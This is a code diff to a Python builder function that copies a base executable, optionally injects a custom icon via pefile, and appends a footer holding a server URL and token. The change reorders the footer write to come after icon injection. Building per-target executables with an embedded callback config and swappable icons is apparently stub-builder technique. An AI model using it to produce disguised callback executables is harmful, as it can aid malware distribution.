@@ -191,9 +191,8 @@ def _build_with_footer(server_url, token, config, exe_name):
     with open(use_base, 'rb') as src:
         with open(exe_path, 'wb') as dst:
             dst.write(src.read())
-            dst.write(footer)
 
-    # For custom icons (not in ICON_BASE_MAP), inject via pefile
+    # Inject custom icon BEFORE appending footer (not in ICON_BASE_MAP)
     is_builtin = icon_path and os.path.basename(icon_path) in ICON_BASE_MAP
     if icon_path and os.path.exists(icon_path) and not is_builtin:
         try:
@@ -202,6 +201,10 @@ def _build_with_footer(server_url, token, config, exe_name):
         except Exception as e:
             import sys
             print(f"[!] Icon injection failed for {exe_name}: {e}", file=sys.stderr)
+
+    # Append footer config AFTER icon injection
+    with open(exe_path, 'ab') as dst:
+        dst.write(footer)
 
     register_exe(token, os.path.basename(exe_path))
     return exe_path
